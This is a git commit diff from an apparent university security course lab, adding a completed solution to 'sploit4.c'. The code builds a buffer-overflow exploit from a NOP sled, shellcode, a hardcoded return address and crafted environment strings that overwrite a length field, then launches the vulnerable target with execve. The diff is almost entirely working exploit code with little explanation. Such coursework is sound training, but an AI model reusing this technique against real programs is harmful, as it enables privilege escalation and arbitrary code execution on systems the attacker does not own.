3889567a420675b1d9a2cb1c0f2daea8b10180f1
Yi Li  Ng <ngyi4@remote.ecf.utoronto.ca>
2024-02-04 13:36:01 -0500

    sploit4 doneee

--- lab1/sploits/sploit4.c
+++ lab1/sploits/sploit4.c
@@ -9,10 +9,41 @@
 int main(void)
 {
   char *args[3];
-  char *env[1];
+  char *env[9];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+  // memory address between buff and len
+  char buffer[400];
+  char *nop = "\x90";
+
+  for (int i = 0; i < 112; i++)
+    strcat(buffer, nop);
+  strcat(buffer, shellcode);
+  for (int i = 0; i < 5; i++)
+    strcat(buffer, nop);
+  strcat(buffer, "\0");
+
+  char *newLen = "\xbc"; //188 in decimal
+  char return_addr[] = "\xf6\xfd\x21\x30"; // addr where NOPs in buffer starts
+
+  char gap[500];
+  for (int i = 0; i < 3; i++)
+    strcat(gap, nop);
+  strcat(gap, return_addr);
+
+  // arguments and envs
+  args[0] = TARGET;
+  args[1] = buffer;
+  args[2] = NULL;
+
+  env[0] = "\0\0";
+  env[1] = "\0";
+  env[2] = "\0";
+  env[3] = newLen;
+  env[4] = "\0\0";
+  env[5] = "\0\0";
+  env[6] = gap;
+  env[7] = "\0";
+  env[8] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
